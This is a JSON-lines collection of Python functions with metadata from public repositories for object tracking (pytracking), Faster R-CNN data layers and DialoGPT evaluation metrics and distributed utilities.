{"docstring": "# Setup IoU net and objective\n", "func_signal": "def init_iou_net(self, backbone_feat):\n", "code": "for p in self.net.bb_regressor.parameters():\n    p.requires_grad = False\n\n# Get target boxes for the different augmentations\nself.classifier_target_box = self.get_iounet_box(self.pos, self.target_sz, self.init_sample_pos, self.init_sample_scale)\ntarget_boxes = TensorList()\nif self.params.iounet_augmentation:\n    for T in self.transforms:\n        if not isinstance(T, (augmentation.Identity, augmentation.Translation, augmentation.FlipHorizontal, augmentation.FlipVertical, augmentation.Blur)):\n            break\n        target_boxes.append(self.classifier_target_box + torch.Tensor([T.shift[1], T.shift[0], 0, 0]))\nelse:\n    target_boxes.append(self.classifier_target_box + torch.Tensor([self.transforms[0].shift[1], self.transforms[0].shift[0], 0, 0]))\ntarget_boxes = torch.cat(target_boxes.view(1,4), 0).to(self.params.device)\n\n# Get iou features\niou_backbone_feat = self.get_iou_backbone_features(backbone_feat)\n\n# Remove other augmentations such as rotation\niou_backbone_feat = TensorList([x[:target_boxes.shape[0],...] for x in iou_backbone_feat])\n\n# Get modulation vector\nself.iou_modulation = self.get_iou_modulation(iou_backbone_feat, target_boxes)\nself.iou_modulation = TensorList([x.detach().mean(0) for x in self.iou_modulation])", "path": "pytracking/pytracking/tracker/kys/kys.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "visionml/pytracking", "stars": 3036, "license": "gpl-3.0", "language": "python", "size": 5071}
{"docstring": "\"\"\"Get blobs and copy them into this layer's top blob vector.\"\"\"\n", "func_signal": "def forward(self):\n", "code": "blobs = self._get_next_minibatch()\nreturn blobs", "path": "Faster-RCNN_TF/lib/roi_data_layer/layer.py", "commit_date": "2016-09-07 00:00:00", "repo_name": "smallcorgi/Faster-RCNN_TF", "stars": 2342, "license": "mit", "language": "python", "size": 1191}
{"docstring": "\"\"\"Randomly permute the training roidb.\"\"\"\n", "func_signal": "def _shuffle_roidb_inds(self):\n", "code": "self._perm = np.random.permutation(np.arange(len(self._roidb)))\nself._cur = 0", "path": "Faster-RCNN_TF/lib/gt_data_layer/layer.py", "commit_date": "2016-09-07 00:00:00", "repo_name": "smallcorgi/Faster-RCNN_TF", "stars": 2342, "license": "mit", "language": "python", "size": 1191}
{"docstring": "\"\"\"Builds an input blob from the images in the roidb at the specified\nscales.\n\"\"\"\n", "func_signal": "def _get_image_blob(roidb, scale_inds):\n", "code": "num_images = len(roidb)\nprocessed_ims = []\nim_scales = []\nfor i in xrange(num_images):\n    im = cv2.imread(roidb[i]['image'])\n    if roidb[i]['flipped']:\n        im = im[:, ::-1, :]\n\n    im_orig = im.astype(np.float32, copy=True)\n    im_orig -= cfg.PIXEL_MEANS\n\n    im_scale = cfg.TRAIN.SCALES_BASE[scale_inds[i]]\n    im = cv2.resize(im_orig, None, None, fx=im_scale, fy=im_scale, interpolation=cv2.INTER_LINEAR)\n\n    im_scales.append(im_scale)\n    processed_ims.append(im)\n\n# Create a blob to hold the input images\nblob = im_list_to_blob(processed_ims)\n\nreturn blob, im_scales", "path": "Faster-RCNN_TF/lib/roi_data_layer/minibatch2.py", "commit_date": "2016-09-07 00:00:00", "repo_name": "smallcorgi/Faster-RCNN_TF", "stars": 2342, "license": "mit", "language": "python", "size": 1191}
{"docstring": "\"\"\"Setup the GtDataLayer.\"\"\"\n\n# parse the layer parameter string, which must be valid YAML\n", "func_signal": "def setup(self, bottom, top):\n", "code": "layer_params = yaml.load(self.param_str_)\n\nself._num_classes = layer_params['num_classes']\n\nself._name_to_top_map = {\n    'data': 0,\n    'info_boxes': 1,\n    'parameters': 2}\n\n# data blob: holds a batch of N images, each with 3 channels\n# The height and width (100 x 100) are dummy values\nnum_scale_base = len(cfg.TRAIN.SCALES_BASE)\ntop[0].reshape(num_scale_base, 3, 100, 100)\n\n# info boxes blob\ntop[1].reshape(1, 18)\n\n# parameters blob\nnum_scale = len(cfg.TRAIN.SCALES)\nnum_aspect = len(cfg.TRAIN.ASPECTS)\ntop[2].reshape(2 + 2*num_scale + 2*num_aspect)", "path": "Faster-RCNN_TF/lib/gt_data_layer/layer.py", "commit_date": "2016-09-07 00:00:00", "repo_name": "smallcorgi/Faster-RCNN_TF", "stars": 2342, "license": "mit", "language": "python", "size": 1191}
{"docstring": "\"\"\"Given a roidb, construct a minibatch sampled from it.\"\"\"\n", "func_signal": "def get_minibatch(roidb, num_classes):\n", "code": "num_images = len(roidb)\n\nassert(cfg.TRAIN.BATCH_SIZE % num_images == 0), \\\n    'num_images ({}) must divide BATCH_SIZE ({})'. \\\n    format(num_images, cfg.TRAIN.BATCH_SIZE)\nrois_per_image = cfg.TRAIN.BATCH_SIZE / num_images\nfg_rois_per_image = np.round(cfg.TRAIN.FG_FRACTION * rois_per_image)\n\nif cfg.IS_MULTISCALE:\n    im_blob, im_scales = _get_image_blob_multiscale(roidb)\nelse:\n    # Get the input image blob, formatted for caffe\n    # Sample random scales to use for each image in this batch\n    random_scale_inds = npr.randint(0, high=len(cfg.TRAIN.SCALES_BASE), size=num_images)\n    im_blob, im_scales = _get_image_blob(roidb, random_scale_inds)\n\nblobs = {'data': im_blob}\n\nif cfg.TRAIN.HAS_RPN:\n    assert len(im_scales) == 1, \"Single batch only\"\n    assert len(roidb) == 1, \"Single batch only\"\n    # gt boxes: (x1, y1, x2, y2, cls)\n    gt_inds = np.where(roidb[0]['gt_classes'] != 0)[0]\n    gt_boxes = np.empty((len(gt_inds), 5), dtype=np.float32)\n    gt_boxes[:, 0:4] = roidb[0]['boxes'][gt_inds, :] * im_scales[0]\n    gt_boxes[:, 4] = roidb[0]['gt_classes'][gt_inds]\n    blobs['gt_boxes'] = gt_boxes\n    blobs['im_info'] = np.array(\n        [[im_blob.shape[1], im_blob.shape[2], im_scales[0]]],\n        dtype=np.float32)\n\n\nelse:\n    # Now, build the region of interest and label blobs\n    rois_blob = np.zeros((0, 5), dtype=np.float32)\n    labels_blob = np.zeros((0), dtype=np.float32)\n    bbox_targets_blob = np.zeros((0, 4 * num_classes), dtype=np.float32)\n    bbox_inside_blob = np.zeros(bbox_targets_blob.shape, dtype=np.float32)\n\n    # all_overlaps = []\n    for im_i in xrange(num_images):\n        labels, overlaps, im_rois, bbox_targets, bbox_inside_weights, sublabels \\\n                = _sample_rois(roidb[im_i], fg_rois_per_image, rois_per_image, num_classes)\n\n        # Add to RoIs blob\n        if cfg.IS_MULTISCALE:\n            if cfg.IS_EXTRAPOLATING:\n                rois, levels = _project_im_rois_multiscale(im_rois, cfg.TRAIN.SCALES)\n                batch_ind = im_i * len(cfg.TRAIN.SCALES) + levels\n            else:\n                rois, levels = _project_im_rois_multiscale(im_rois, cfg.TRAIN.SCALES_BASE)\n                batch_ind = im_i * len(cfg.TRAIN.SCALES_BASE) + levels\n        else:\n            rois = _project_im_rois(im_rois, im_scales[im_i])\n            batch_ind = im_i * np.ones((rois.shape[0], 1))\n\n        rois_blob_this_image = np.hstack((batch_ind, rois))\n        rois_blob = np.vstack((rois_blob, rois_blob_this_image))\n\n        # Add to labels, bbox targets, and bbox loss blobs\n        labels_blob = np.hstack((labels_blob, labels))\n        bbox_targets_blob = np.vstack((bbox_targets_blob, bbox_targets))\n        bbox_inside_blob = np.vstack((bbox_inside_blob, bbox_inside_weights))\n\n        # all_overlaps = np.hstack((all_overlaps, overlaps))\n\n    # For debug visualizations\n    # _vis_minibatch(im_blob, rois_blob, labels_blob, all_overlaps, sublabels_blob, view_targets_blob, view_inside_blob)\n    # _vis_minibatch(im_blob, rois_blob, labels_blob, all_overlaps, sublabels_blob)\n\n    blobs['rois'] = rois_blob\n    blobs['labels'] = labels_blob\n\n    if cfg.TRAIN.BBOX_REG:\n        blobs['bbox_targets'] = bbox_targets_blob\n        blobs['bbox_inside_weights'] = bbox_inside_blob\n        blobs['bbox_outside_weights'] = np.array(bbox_inside_blob > 0).astype(np.float32)\n\nreturn blobs", "path": "Faster-RCNN_TF/lib/roi_data_layer/minibatch2.py", "commit_date": "2016-09-07 00:00:00", "repo_name": "smallcorgi/Faster-RCNN_TF", "stars": 2342, "license": "mit", "language": "python", "size": 1191}
{"docstring": "\"\"\"Set the roidb to be used by this layer during training.\"\"\"\n", "func_signal": "def set_roidb(self, roidb):\n", "code": "self._roidb = roidb\nself._shuffle_roidb_inds()", "path": "Faster-RCNN_TF/lib/gt_data_layer/layer.py", "commit_date": "2016-09-07 00:00:00", "repo_name": "smallcorgi/Faster-RCNN_TF", "stars": 2342, "license": "mit", "language": "python", "size": 1191}
{"docstring": "\"\"\"Return the blobs to be used for the next minibatch.\"\"\"\n", "func_signal": "def _get_next_minibatch(self):\n", "code": "db_inds = self._get_next_minibatch_inds()\nminibatch_db = [self._roidb[i] for i in db_inds]\nreturn get_minibatch(minibatch_db, self._num_classes)", "path": "Faster-RCNN_TF/lib/gt_data_layer/layer.py", "commit_date": "2016-09-07 00:00:00", "repo_name": "smallcorgi/Faster-RCNN_TF", "stars": 2342, "license": "mit", "language": "python", "size": 1191}
{"docstring": "\"\"\"Compute bounding-box regression targets for an image.\"\"\"\n\n", "func_signal": "def _compute_targets(ex_rois, gt_rois):\n", "code": "assert ex_rois.shape[0] == gt_rois.shape[0]\nassert ex_rois.shape[1] == 4\nassert gt_rois.shape[1] == 5\n\nreturn bbox_transform(ex_rois, gt_rois[:, :4]).astype(np.float32, copy=False)", "path": "Faster-RCNN_TF/lib/rpn_msr/anchor_target_layer_tf.py", "commit_date": "2016-09-20 00:00:00", "repo_name": "smallcorgi/Faster-RCNN_TF", "stars": 2342, "license": "mit", "language": "python", "size": 1191}
{"docstring": "\"\"\"Get blobs and copy them into this layer's top blob vector.\"\"\"\n", "func_signal": "def forward(self, bottom, top):\n", "code": "blobs = self._get_next_minibatch()\n\nfor blob_name, blob in blobs.iteritems():\n    top_ind = self._name_to_top_map[blob_name]\n    # Reshape net's input blobs\n    top[top_ind].reshape(*(blob.shape))\n    # Copy data into net's input blobs\n    top[top_ind].data[...] = blob.astype(np.float32, copy=False)", "path": "Faster-RCNN_TF/lib/gt_data_layer/layer.py", "commit_date": "2016-09-07 00:00:00", "repo_name": "smallcorgi/Faster-RCNN_TF", "stars": 2342, "license": "mit", "language": "python", "size": 1191}
{"docstring": "\"\"\"Bounding-box regression targets are stored in a compact form in the\nroidb.\n\nThis function expands those targets into the 4-of-4*K representation used\nby the network (i.e. only one class has non-zero targets). The loss weights\nare similarly expanded.\n\nReturns:\n    view_target_data (ndarray): N x 3K blob of regression targets\n    view_loss_weights (ndarray): N x 3K blob of loss weights\n\"\"\"\n", "func_signal": "def _get_viewpoint_estimation_labels(viewpoint_data, clss, num_classes):\n", "code": "view_targets = np.zeros((clss.size, 3 * num_classes), dtype=np.float32)\nview_loss_weights = np.zeros(view_targets.shape, dtype=np.float32)\ninds = np.where( (clss > 0) & np.isfinite(viewpoint_data[:,0]) & np.isfinite(viewpoint_data[:,1]) & np.isfinite(viewpoint_data[:,2]) )[0]\nfor ind in inds:\n    cls = clss[ind]\n    start = 3 * cls\n    end = start + 3\n    view_targets[ind, start:end] = viewpoint_data[ind, :]\n    view_loss_weights[ind, start:end] = [1., 1., 1.]\n\nassert not np.isinf(view_targets).any(), 'viewpoint undefined'\nreturn view_targets, view_loss_weights", "path": "Faster-RCNN_TF/lib/roi_data_layer/minibatch2.py", "commit_date": "2016-09-07 00:00:00", "repo_name": "smallcorgi/Faster-RCNN_TF", "stars": 2342, "license": "mit", "language": "python", "size": 1191}
{"docstring": "\"\"\"Return the blobs to be used for the next minibatch.\n\nIf cfg.TRAIN.USE_PREFETCH is True, then blobs will be computed in a\nseparate process and made available through self._blob_queue.\n\"\"\"\n", "func_signal": "def _get_next_minibatch(self):\n", "code": "db_inds = self._get_next_minibatch_inds()\nminibatch_db = [self._roidb[i] for i in db_inds]\nreturn get_minibatch(minibatch_db, self._num_classes)", "path": "Faster-RCNN_TF/lib/roi_data_layer/layer.py", "commit_date": "2016-09-07 00:00:00", "repo_name": "smallcorgi/Faster-RCNN_TF", "stars": 2342, "license": "mit", "language": "python", "size": 1191}
{"docstring": "\"\"\"Generate a random sample of RoIs comprising foreground and background\nexamples.\n\"\"\"\n# label = class RoI has max overlap with\n", "func_signal": "def _sample_rois(roidb, fg_rois_per_image, rois_per_image, num_classes):\n", "code": "labels = roidb['max_classes']\noverlaps = roidb['max_overlaps']\nrois = roidb['boxes']\n\n# Select foreground RoIs as those with >= FG_THRESH overlap\nfg_inds = []\nfor i in xrange(1, num_classes):\n    fg_inds.extend(np.where((labels == i) & (overlaps >= cfg.TRAIN.FG_THRESH))[0])\nfg_inds = np.array(fg_inds)\n\n# Guard against the case when an image has fewer than fg_rois_per_image\n# foreground RoIs\nfg_rois_per_this_image = np.minimum(fg_rois_per_image, fg_inds.size)\n# Sample foreground regions without replacement\nif fg_inds.size > 0:\n    fg_inds = npr.choice(fg_inds, size=fg_rois_per_this_image,\n                         replace=False)\n\nbg_rois_per_this_image = rois_per_image - fg_rois_per_this_image\n# Select background RoIs as those within [BG_THRESH_LO, BG_THRESH_HI)\nbg_inds = []\nfor i in xrange(1, num_classes):\n    bg_inds.extend( np.where((labels == i) & (overlaps < cfg.TRAIN.BG_THRESH_HI) &\n                    (overlaps >= cfg.TRAIN.BG_THRESH_LO))[0] )\n\nif len(bg_inds) < bg_rois_per_this_image:\n    for i in xrange(1, num_classes):\n        bg_inds.extend( np.where((labels == i) & (overlaps < cfg.TRAIN.BG_THRESH_HI))[0] )\n\nif len(bg_inds) < bg_rois_per_this_image:\n    bg_inds.extend( np.where(overlaps < cfg.TRAIN.BG_THRESH_HI)[0] )\nbg_inds = np.array(bg_inds, dtype=np.int32)\n\n# Compute number of background RoIs to take from this image (guarding\n# against there being fewer than desired)\nbg_rois_per_this_image = np.minimum(bg_rois_per_this_image,\n                                    bg_inds.size)\n# Sample foreground regions without replacement\nif bg_inds.size > 0:\n    bg_inds = npr.choice(bg_inds, size=bg_rois_per_this_image,\n                         replace=False)\n\n# The indices that we're selecting (both fg and bg)\nkeep_inds = np.append(fg_inds, bg_inds).astype(int)\n# print '{} foregrounds and {} backgrounds'.format(fg_inds.size, bg_inds.size)\n# Select sampled values from various arrays:\nlabels = labels[keep_inds]\n# Clamp labels for the background RoIs to 0\nlabels[fg_rois_per_this_image:] = 0\noverlaps = overlaps[keep_inds]\nrois = rois[keep_inds]\nsublabels = sublabels[keep_inds]\nsublabels[fg_rois_per_this_image:] = 0\n\nbbox_targets, bbox_loss_weights = \\\n        _get_bbox_regression_labels(roidb['bbox_targets'][keep_inds, :],\n                                    num_classes)\n\nif cfg.TRAIN.VIEWPOINT or cfg.TEST.VIEWPOINT:\n    viewpoints = viewpoints[keep_inds]\n    view_targets, view_loss_weights = \\\n            _get_viewpoint_estimation_labels(viewpoints, labels, num_classes)\n    return labels, overlaps, rois, bbox_targets, bbox_loss_weights, sublabels, view_targets, view_loss_weights\n\nreturn labels, overlaps, rois, bbox_targets, bbox_loss_weights, sublabels", "path": "Faster-RCNN_TF/lib/roi_data_layer/minibatch2.py", "commit_date": "2016-09-07 00:00:00", "repo_name": "smallcorgi/Faster-RCNN_TF", "stars": 2342, "license": "mit", "language": "python", "size": 1191}
{"docstring": "\"\"\" Unmap a subset of item (data) back to the original set of items (of\nsize count) \"\"\"\n", "func_signal": "def _unmap(data, count, inds, fill=0):\n", "code": "if len(data.shape) == 1:\n    ret = np.empty((count, ), dtype=np.float32)\n    ret.fill(fill)\n    ret[inds] = data\nelse:\n    ret = np.empty((count, ) + data.shape[1:], dtype=np.float32)\n    ret.fill(fill)\n    ret[inds, :] = data\nreturn ret", "path": "Faster-RCNN_TF/lib/rpn_msr/anchor_target_layer_tf.py", "commit_date": "2016-09-20 00:00:00", "repo_name": "smallcorgi/Faster-RCNN_TF", "stars": 2342, "license": "mit", "language": "python", "size": 1191}
{"docstring": "\"\"\"\nReturn the boxes on image grid.\n\"\"\"\n\n# height and width of the heatmap\n", "func_signal": "def get_boxes_grid(image_height, image_width):\n", "code": "if cfg.NET_NAME == 'CaffeNet':\n    height = np.floor((image_height * max(cfg.TRAIN.SCALES) - 1) / 4.0 + 1)\n    height = np.floor((height - 1) / 2.0 + 1 + 0.5)\n    height = np.floor((height - 1) / 2.0 + 1 + 0.5)\n\n    width = np.floor((image_width * max(cfg.TRAIN.SCALES) - 1) / 4.0 + 1)\n    width = np.floor((width - 1) / 2.0 + 1 + 0.5)\n    width = np.floor((width - 1) / 2.0 + 1 + 0.5)\nelif cfg.NET_NAME == 'VGGnet':\n    height = np.floor(image_height * max(cfg.TRAIN.SCALES) / 2.0 + 0.5)\n    height = np.floor(height / 2.0 + 0.5)\n    height = np.floor(height / 2.0 + 0.5)\n    height = np.floor(height / 2.0 + 0.5)\n\n    width = np.floor(image_width * max(cfg.TRAIN.SCALES) / 2.0 + 0.5)\n    width = np.floor(width / 2.0 + 0.5)\n    width = np.floor(width / 2.0 + 0.5)\n    width = np.floor(width / 2.0 + 0.5)\nelse:\n    assert (1), 'The network architecture is not supported in utils.get_boxes_grid!'\n\n# compute the grid box centers\nh = np.arange(height)\nw = np.arange(width)\ny, x = np.meshgrid(h, w, indexing='ij') \ncenters = np.dstack((x, y))\ncenters = np.reshape(centers, (-1, 2))\nnum = centers.shape[0]\n\n# compute width and height of grid box\narea = cfg.TRAIN.KERNEL_SIZE * cfg.TRAIN.KERNEL_SIZE\naspect = cfg.TRAIN.ASPECTS  # height / width\nnum_aspect = len(aspect)\nwidths = np.zeros((1, num_aspect), dtype=np.float32)\nheights = np.zeros((1, num_aspect), dtype=np.float32)\nfor i in xrange(num_aspect):\n    widths[0,i] = math.sqrt(area / aspect[i])\n    heights[0,i] = widths[0,i] * aspect[i]\n\n# construct grid boxes\ncenters = np.repeat(centers, num_aspect, axis=0)\nwidths = np.tile(widths, num).transpose()\nheights = np.tile(heights, num).transpose()\n\nx1 = np.reshape(centers[:,0], (-1, 1)) - widths * 0.5\nx2 = np.reshape(centers[:,0], (-1, 1)) + widths * 0.5\ny1 = np.reshape(centers[:,1], (-1, 1)) - heights * 0.5\ny2 = np.reshape(centers[:,1], (-1, 1)) + heights * 0.5\n\nboxes_grid = np.hstack((x1, y1, x2, y2)) / cfg.TRAIN.SPATIAL_SCALE\n\nreturn boxes_grid, centers[:,0], centers[:,1]", "path": "Faster-RCNN_TF/lib/utils/boxes_grid.py", "commit_date": "2016-09-07 00:00:00", "repo_name": "smallcorgi/Faster-RCNN_TF", "stars": 2342, "license": "mit", "language": "python", "size": 1191}
{"docstring": "\"\"\"Return the roidb indices for the next minibatch.\"\"\"\n\n", "func_signal": "def _get_next_minibatch_inds(self):\n", "code": "if cfg.TRAIN.HAS_RPN:\n    if self._cur + cfg.TRAIN.IMS_PER_BATCH >= len(self._roidb):\n        self._shuffle_roidb_inds()\n\n    db_inds = self._perm[self._cur:self._cur + cfg.TRAIN.IMS_PER_BATCH]\n    self._cur += cfg.TRAIN.IMS_PER_BATCH\nelse:\n    # sample images\n    db_inds = np.zeros((cfg.TRAIN.IMS_PER_BATCH), dtype=np.int32)\n    i = 0\n    while (i < cfg.TRAIN.IMS_PER_BATCH):\n        ind = self._perm[self._cur]\n        num_objs = self._roidb[ind]['boxes'].shape[0]\n        if num_objs != 0:\n            db_inds[i] = ind\n            i += 1\n\n        self._cur += 1\n        if self._cur >= len(self._roidb):\n            self._shuffle_roidb_inds()\n\nreturn db_inds", "path": "Faster-RCNN_TF/lib/roi_data_layer/layer.py", "commit_date": "2016-09-07 00:00:00", "repo_name": "smallcorgi/Faster-RCNN_TF", "stars": 2342, "license": "mit", "language": "python", "size": 1191}
{"docstring": "\"\"\"Return the roidb indices for the next minibatch.\"\"\"\n", "func_signal": "def _get_next_minibatch_inds(self):\n", "code": "if self._cur + cfg.TRAIN.IMS_PER_BATCH >= len(self._roidb):\n    self._shuffle_roidb_inds()\n\ndb_inds = self._perm[self._cur:self._cur + cfg.TRAIN.IMS_PER_BATCH]\nself._cur += cfg.TRAIN.IMS_PER_BATCH\n\n\"\"\"\n# sample images with gt objects\ndb_inds = np.zeros((cfg.TRAIN.IMS_PER_BATCH), dtype=np.int32)\ni = 0\nwhile (i < cfg.TRAIN.IMS_PER_BATCH):\n    ind = self._perm[self._cur]\n    num_objs = self._roidb[ind]['boxes'].shape[0]\n    if num_objs != 0:\n        db_inds[i] = ind\n        i += 1\n\n    self._cur += 1\n    if self._cur >= len(self._roidb):\n        self._shuffle_roidb_inds()\n\"\"\"\n\nreturn db_inds", "path": "Faster-RCNN_TF/lib/gt_data_layer/layer.py", "commit_date": "2016-09-07 00:00:00", "repo_name": "smallcorgi/Faster-RCNN_TF", "stars": 2342, "license": "mit", "language": "python", "size": 1191}
{"docstring": "\"\"\"Project image RoIs into the image pyramid built by _get_image_blob.\n\nArguments:\n    im_rois (ndarray): R x 4 matrix of RoIs in original image coordinates\n    scales (list): scale factors as returned by _get_image_blob\n\nReturns:\n    rois (ndarray): R x 4 matrix of projected RoI coordinates\n    levels (list): image pyramid levels used by each projected RoI\n\"\"\"\n", "func_signal": "def _project_im_rois_multiscale(im_rois, scales):\n", "code": "im_rois = im_rois.astype(np.float, copy=False)\nscales = np.array(scales)\n\nif len(scales) > 1:\n    widths = im_rois[:, 2] - im_rois[:, 0] + 1\n    heights = im_rois[:, 3] - im_rois[:, 1] + 1\n\n    areas = widths * heights\n    scaled_areas = areas[:, np.newaxis] * (scales[np.newaxis, :] ** 2)\n    diff_areas = np.abs(scaled_areas - 224 * 224)\n    levels = diff_areas.argmin(axis=1)[:, np.newaxis]\nelse:\n    levels = np.zeros((im_rois.shape[0], 1), dtype=np.int)\n\nrois = im_rois * scales[levels]\n\nreturn rois, levels", "path": "Faster-RCNN_TF/lib/roi_data_layer/minibatch2.py", "commit_date": "2016-09-07 00:00:00", "repo_name": "smallcorgi/Faster-RCNN_TF", "stars": 2342, "license": "mit", "language": "python", "size": 1191}
{"docstring": "\"\"\"Set the roidb to be used by this layer during training.\"\"\"\n", "func_signal": "def __init__(self, roidb, num_classes):\n", "code": "self._roidb = roidb\nself._num_classes = num_classes\nself._shuffle_roidb_inds()", "path": "Faster-RCNN_TF/lib/roi_data_layer/layer.py", "commit_date": "2016-09-07 00:00:00", "repo_name": "smallcorgi/Faster-RCNN_TF", "stars": 2342, "license": "mit", "language": "python", "size": 1191}
{"docstring": "\"\"\"Project image RoIs into the rescaled training image.\"\"\"\n", "func_signal": "def _project_im_rois(im_rois, im_scale_factor):\n", "code": "rois = im_rois * im_scale_factor\nreturn rois", "path": "Faster-RCNN_TF/lib/roi_data_layer/minibatch2.py", "commit_date": "2016-09-07 00:00:00", "repo_name": "smallcorgi/Faster-RCNN_TF", "stars": 2342, "license": "mit", "language": "python", "size": 1191}
{"docstring": "# A roidb is a list of dictionaries, each with the following keys:\n#   boxes\n#   gt_overlaps\n#   gt_classes\n#   flipped\n", "func_signal": "def roidb(self):\n", "code": "if self._roidb is not None:\n    return self._roidb\nself._roidb = self.roidb_handler()\nreturn self._roidb", "path": "Faster-RCNN_TF/lib/datasets/imdb.py", "commit_date": "2016-09-07 00:00:00", "repo_name": "smallcorgi/Faster-RCNN_TF", "stars": 2342, "license": "mit", "language": "python", "size": 1191}
{"docstring": "\"\"\"\nCompute ROUGE-L score given one candidate and references for an image\n:param candidate: str : candidate sentence to be evaluated\n:param refs: list of str : COCO reference sentences for the particular image to be evaluated\n:returns score: int (ROUGE-L score for the candidate evaluated against references)\n\"\"\"\n", "func_signal": "def calc_score(self, candidate, refs):\n", "code": "assert(len(candidate)==1)\t\nassert(len(refs)>0)         \nprec = []\nrec = []\n\n# split into tokens\ntoken_c = candidate[0].split(\" \")\n    \t\nfor reference in refs:\n    # split into tokens\n    token_r = reference.split(\" \")\n    # compute the longest common subsequence\n    lcs = my_lcs(token_r, token_c)\n    prec.append(lcs/float(len(token_c)))\n    rec.append(lcs/float(len(token_r)))\n\nprec_max = max(prec)\nrec_max = max(rec)\n\nif(prec_max!=0 and rec_max !=0):\n    score = ((1 + self.beta**2)*prec_max*rec_max)/float(rec_max + self.beta**2*prec_max)\nelse:\n    score = 0.0\nreturn score", "path": "DialoGPT/pycocoevalcap/rouge/rouge.py", "commit_date": "2019-10-13 00:00:00", "repo_name": "microsoft/DialoGPT", "stars": 2301, "license": "mit", "language": "python", "size": 45751}
{"docstring": "\"\"\"\nTakes a string as input and returns an object that can be given to\neither cook_refs or cook_test. This is optional: cook_refs and cook_test\ncan take string arguments as well.\n:param s: string : sentence to be converted into ngrams\n:param n: int    : number of ngrams for which representation is calculated\n:return: term frequency vector for occuring ngrams\n\"\"\"\n", "func_signal": "def precook(s, n=4, out=False):\n", "code": "words = s.split()\ncounts = defaultdict(int)\nfor k in range(1,n+1):\n    for i in range(len(words)-k+1):\n        ngram = tuple(words[i:i+k])\n        counts[ngram] += 1\nreturn counts", "path": "DialoGPT/pycocoevalcap/cider/cider_scorer.py", "commit_date": "2019-10-13 00:00:00", "repo_name": "microsoft/DialoGPT", "stars": 2301, "license": "mit", "language": "python", "size": 45751}
{"docstring": "''' singular instance '''\n", "func_signal": "def __init__(self, test=None, refs=None, n=4, sigma=6.0):\n", "code": "self.n = n\nself.sigma = sigma\nself.crefs = []\nself.ctest = []\nself.document_frequency = defaultdict(float)\nself.cook_append(test, refs)\nself.ref_len = None", "path": "DialoGPT/pycocoevalcap/cider/cider_scorer.py", "commit_date": "2019-10-13 00:00:00", "repo_name": "microsoft/DialoGPT", "stars": 2301, "license": "mit", "language": "python", "size": 45751}
{"docstring": "'''\nCompute term frequency for reference data.\nThis will be used to compute idf (inverse document frequency later)\nThe term frequency is stored in the object\n:return: None\n'''\n", "func_signal": "def compute_doc_freq(self):\n", "code": "for refs in self.crefs:\n    # refs, k ref captions of one image\n    for ngram in set([ngram for ref in refs for (ngram,count) in ref.items()]):\n        self.document_frequency[ngram] += 1\n    # maxcounts[ngram] = max(maxcounts.get(ngram,0), count)", "path": "DialoGPT/pycocoevalcap/cider/cider_scorer.py", "commit_date": "2019-10-13 00:00:00", "repo_name": "microsoft/DialoGPT", "stars": 2301, "license": "mit", "language": "python", "size": 45751}
{"docstring": "\"\"\"\nCalculates longest common subsequence for a pair of tokenized strings\n:param string : list of str : tokens from a string split using whitespace\n:param sub : list of str : shorter string, also split using whitespace\n:returns: length (list of int): length of the longest common subsequence between the two strings\n\nNote: my_lcs only gives length of the longest common subsequence, not the actual LCS\n\"\"\"\n", "func_signal": "def my_lcs(string, sub):\n", "code": "if(len(string)< len(sub)):\n    sub, string = string, sub\n\nlengths = [[0 for i in range(0,len(sub)+1)] for j in range(0,len(string)+1)]\n\nfor j in range(1,len(sub)+1):\n    for i in range(1,len(string)+1):\n        if(string[i-1] == sub[j-1]):\n            lengths[i][j] = lengths[i-1][j-1] + 1\n        else:\n            lengths[i][j] = max(lengths[i-1][j] , lengths[i][j-1])\n\nreturn lengths[len(string)][len(sub)]", "path": "DialoGPT/pycocoevalcap/rouge/rouge.py", "commit_date": "2019-10-13 00:00:00", "repo_name": "microsoft/DialoGPT", "stars": 2301, "license": "mit", "language": "python", "size": 45751}
{"docstring": "\"\"\"Gathers arbitrary data from all nodes into a list.\"\"\"\n", "func_signal": "def all_gather_list(data, max_size=4096):\n", "code": "world_size = torch.distributed.get_world_size()\nif not hasattr(all_gather_list, '_in_buffer') or \\\n        max_size != all_gather_list._in_buffer.size():\n    all_gather_list._in_buffer = torch.cuda.ByteTensor(max_size)\n    all_gather_list._out_buffers = [\n        torch.cuda.ByteTensor(max_size)\n        for i in range(world_size)\n    ]\nin_buffer = all_gather_list._in_buffer\nout_buffers = all_gather_list._out_buffers\n\nenc = pickle.dumps(data)\nenc_size = len(enc)\nif enc_size + 2 > max_size:\n    raise ValueError(\n        'encoded data exceeds max_size: {}'.format(enc_size + 2))\nassert max_size < 255*256\nin_buffer[0] = enc_size // 255  # this encoding works for max_size < 65k\nin_buffer[1] = enc_size % 255\nin_buffer[2:enc_size+2] = torch.ByteTensor(list(enc))\n\ntorch.distributed.all_gather(out_buffers, in_buffer.cuda())\n\nresults = []\nfor i in range(world_size):\n    out_buffer = out_buffers[i]\n    size = (255 * out_buffer[0].item()) + out_buffer[1].item()\n\n    bytes_list = bytes(out_buffer[2:size+2].tolist())\n    result = pickle.loads(bytes_list)\n    results.append(result)\nreturn results", "path": "DialoGPT/gpt2_training/distributed.py", "commit_date": "2019-10-13 00:00:00", "repo_name": "microsoft/DialoGPT", "stars": 2301, "license": "mit", "language": "python", "size": 45751}
{"docstring": "# copy tensors into buffer_t\n", "func_signal": "def all_reduce_buffer():\n", "code": "offset = 0\nfor t in buffer:\n    numel = t.numel()\n    buffer_t[offset:offset+numel].copy_(t.view(-1))\n    offset += numel\n\n# all-reduce and rescale\ntorch.distributed.all_reduce(buffer_t[:offset])\nbuffer_t.div_(rescale_denom)\n\n# copy all-reduced buffer back into tensors\noffset = 0\nfor t in buffer:\n    numel = t.numel()\n    t.view(-1).copy_(buffer_t[offset:offset+numel])\n    offset += numel", "path": "DialoGPT/gpt2_training/distributed.py", "commit_date": "2019-10-13 00:00:00", "repo_name": "microsoft/DialoGPT", "stars": 2301, "license": "mit", "language": "python", "size": 45751}
